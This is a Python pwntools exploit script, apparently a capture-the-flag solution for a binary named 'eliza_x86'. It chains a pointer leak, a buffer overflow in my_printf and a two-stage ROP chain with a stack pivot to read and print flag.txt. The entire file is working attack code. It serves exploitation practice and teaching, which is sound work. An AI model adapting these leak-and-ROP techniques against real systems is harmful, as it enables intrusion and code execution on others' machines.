#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux', log_level='debug')

elf = ELF('./eliza_x86')
p   = process(elf.path)

p.sendline('help')
p.sendline('info eliza')

#
# The string with the designation number is not null terminated
#
p.recvuntil('Designation Number: ')
p.recvn(32)
module_ptr  = u32(p.recvn(4))
elf.address = module_ptr - 0x4cc7
p.clean()

log.info("Leaked module pointer: %#x" % module_ptr)


#
# Overflow in my_printf
#
# Create a cyclic pattern to hold our data so that we can calculate offsets
# Make it a mutable bytearray so that we can overwrite data
#
pattern = cyclic(790)
pattern = bytearray(pattern)

def insert(buf, offset, data):
    buf[offset:offset+len(data)] = data

#
# First crash is on a CMP ESI
#
# ESI: 0x66616176 (b'vaaf')
# EDI: 0xd (b'\r')
#
#    0xf774a5b0 <my_printf+48>:   mov    esi,DWORD PTR [esp+0x260]
#    0xf774a5b7 <my_printf+55>:   add    esi,edi
# => 0xf774a5b9 <my_printf+57>:   cmp    BYTE PTR [esi],0x0
#
# We want [ESI+EDI] to be a NUL byte.
#
# base+0x4CD2 is a NUL byte.
#
insert(pattern,
       cyclic_find(p32(0x66616176-0xD)),
       p32(elf.address+0x4CD2-0xD))



#
# If we trigger the NUL branch, we return from my_printf with the following context
#
# EDI: 0x66616166 (b'faaf')
# ---
# => 0xf771b7d6 <my_printf+598>:  ret
# ----
# 00:0000| esp 0xffd3ac1c ("haaf\305\\q\367jaafkaa"...)
# 01:0004|     0xffd3ac20 --> 0xf7715cc5 (<dohelp+389>:   (bad))
# 02:0008|     0xffd3ac24 ("jaafkaaflaafmaa"...)
# 03:0012|     0xffd3ac28 ("kaaflaafmaafnaa"...)
#
# With this, we can then rocket on over to:
#
# .text:0000132E         mov     eax, edi ; buf
# .text:00001330         call    get_command_line
#
# Which will read into the .data section without any restrictions
# except that there's no newlines allowed.
#

#
# First, locate the target and set it so EDI will contain that value
#
# We also have to be wary that the packed value does not contain a
# newline.
#
data_section = elf.address + elf.get_section_by_name('.data').header.sh_addr

while '\x10' in p32(data_section):
    data_section += 1

insert(pattern, cyclic_find('faaf'), p32(data_section))

#
# Now we can build the ROP that will jump to the get_command_line() routine,
# then continue ROPing in the second stage.
#
# Since this is a __usercall routine, we need a way to load EAX.
# There does't appear to be a 'pop eax' gadget anywhere, so...
#
# 0x000050a2 : pop edx ; ret
# 0x00005dab : mov eax, edx ; ret
##
# We migrate to the second stage with this gadget:
#
# 0x000044a0 : pop esp ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
#
rop1 = ROP(elf)
rop1.raw(elf.address + 0x50a2) # pop edx
rop1.raw(data_section)         # ... edx
rop1.raw(elf.address + 0x5dab) # mov eax, edx

rop1.raw(elf.address + 0x5b50) # get_command_line

rop1.raw(elf.address + 0x44a0) # pop esp
rop1.raw(data_section)         # ... esp

log.info("ROP Stage 1\n%s" % rop1.dump())

insert(pattern, cyclic_find('haaf'), str(rop1))

#
# Send the large buffer to overflow, read in data, and migrate
#
assert '\n' not in str(pattern)
p.sendline('jump ' + str(pattern)) # pattern)

#
# This second stage can be self-referential
#
rop2 = ROP(elf)
rop2.base = data_section

# Account for the pops at the end of the switch
rop2.raw(0) # ebx
rop2.raw(0) # esi
rop2.raw(0) # edi
rop2.raw(0) # ebp

# The .PLT requires that EBX points to .GOT.PLT
def fix_plt_ptr():
    rop2.raw(rop2.ebx[0])
    rop2.raw(elf.address + 0x9000)

# Open the flag file.  Assume that this ends up in FD #4.
fix_plt_ptr()
rop2.open('flag.txt', constants.O_RDONLY)

# Read the flag file into the data, but further down
fix_plt_ptr()

rop2.read(5, data_section + 0x100, 0xfff)

# Write the flag data out
fix_plt_ptr()
rop2.write(constants.STDOUT_FILENO, "Flag: ", 6)
fix_plt_ptr()
rop2.write(constants.STDOUT_FILENO, data_section + 0x100, 0x30)

log.info("ROP Stage 2:\n%s" % rop2.dump())

assert '\n' not in str(rop2)

time.sleep(1)

p.sendline(str(rop2))
p.recvuntil('Flag: ')

log.info("Flag:\n%s" % p.recvall())